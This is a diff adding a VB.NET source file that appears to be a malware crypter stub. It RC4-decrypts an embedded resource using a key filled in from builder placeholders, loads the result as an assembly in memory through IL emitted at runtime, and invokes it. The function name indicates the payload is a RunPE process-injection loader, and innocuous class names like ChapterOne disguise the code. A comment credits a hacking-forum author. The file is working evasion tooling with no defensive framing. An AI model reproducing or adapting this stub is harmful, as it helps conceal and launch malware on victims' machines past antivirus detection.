@@ -1,0 +1,92 @@
+Option Explicit Off
+Option Strict Off
+Imports System, Microsoft.VisualBasic
+Imports Microsoft.VisualBasic.CompilerServices
+Imports System.Reflection
+Imports System.Text
+Imports System.Security.Cryptography
+Imports System.IO.Compression
+Imports System.IO
+Imports System.Runtime.InteropServices
+Imports System.Runtime.CompilerServices
+Imports System.Reflection.Emit
+
+Namespace Intro
+
+    Public Class ChapterOne
+
+        Public Shared Sub Main()
+            Invoke(retrieveRunPE, "bp_Spc.bp_Cls", "bp_Mth", New Object() {})
+        End Sub
+
+        Public Shared Function Invoke(ByVal input() As Byte, ByVal cls As String, ByVal procname As String, ByVal args() As Object) As Object
+            Dim handler As New DynamicMethod("", GetType(Object), New [Type]() {GetType(Byte()), GetType(String), GetType(String), GetType(Object())})
+            Dim IL As ILGenerator = handler.GetILGenerator
+
+            Dim argsLoad() As Type = New [Type]() {GetType(Byte())}
+            Dim mthLoad As MethodInfo = GetType(Assembly).GetMethod("Load", argsLoad)
+
+            Dim argsGTYPE() As Type = New [Type]() {GetType(String)}
+            Dim mthGTYPE As MethodInfo = GetType(Assembly).GetMethod("GetType", argsGTYPE)
+
+            Dim argsActi() As Type = New [Type]() {GetType(Type)}
+            Dim mthActi As MethodInfo = GetType(Activator).GetMethod("CreateInstance", argsActi)
+
+            Dim argsGetVal() As Type = New [Type]() {GetType(Object)}
+            Dim mthGetVal As MethodInfo = GetType(RuntimeHelpers).GetMethod("GetObjectValue", argsGetVal)
+
+            Dim mthCallByName As MethodInfo = GetType(Versioned).GetMethod("CallByName")
+
+            IL.Emit(OpCodes.Ldarg_0)
+            IL.Emit(OpCodes.Call, mthLoad)
+            IL.Emit(OpCodes.Ldarg_1)
+            IL.EmitCall(OpCodes.Callvirt, mthGTYPE, Nothing)
+            IL.Emit(OpCodes.Call, mthActi)
+            IL.Emit(OpCodes.Call, mthGetVal)
+            IL.Emit(OpCodes.Ldarg_2)
+            IL.Emit(OpCodes.Ldc_I4_1)
+            IL.Emit(OpCodes.Ldarg_3)
+            IL.Emit(OpCodes.Call, mthCallByName)
+            IL.Emit(OpCodes.Ret)
+            Return CallByName(handler, "Invoke", CallType.Method, New Object() {handler, New Object() {input, cls, procname, args}})
+        End Function
+
+        Public Shared Function retrieveRunPE() As Byte()
+            Dim resMan As New Resources.ResourceManager("2016", Assembly.GetEntryAssembly)
+            Return Proper_RC4(Encoding.Default.GetBytes(resMan.GetObject("%libraryName%")), Encoding.Default.GetBytes("%keyBytes%"))
+        End Function
+
+        Private Shared Function Proper_RC4(ByVal Input As Byte(), ByVal Key As Byte()) As Byte()
+            'Leave a thanks at least..
+            'by d3c0mpil3r from HF
+            Dim i, j, swap As UInteger
+            Dim s As UInteger() = New UInteger(255) {}
+            Dim Output As Byte() = New Byte(Input.Length - 1) {}
+
+            For i = 0 To 255
+                s(i) = i
+            Next
+
+            For i = 0 To 255
+                j = (j + Key(i Mod Key.Length) + s(i)) And 255
+                swap = s(i) 'Swapping of s(i) and s(j)
+                s(i) = s(j)
+                s(j) = swap
+            Next
+
+            i = 0 : j = 0
+            For c = 0 To Output.Length - 1
+                i = (i + 1) And 255
+                j = (j + s(i)) And 255
+                swap = s(i) 'Swapping of s(i) and s(j)
+                s(i) = s(j)
+                s(j) = swap
+                Output(c) = Input(c) Xor s((s(i) + s(j)) And 255)
+            Next
+
+            Return Output
+        End Function
+
+    End Class
+
+End Namespace
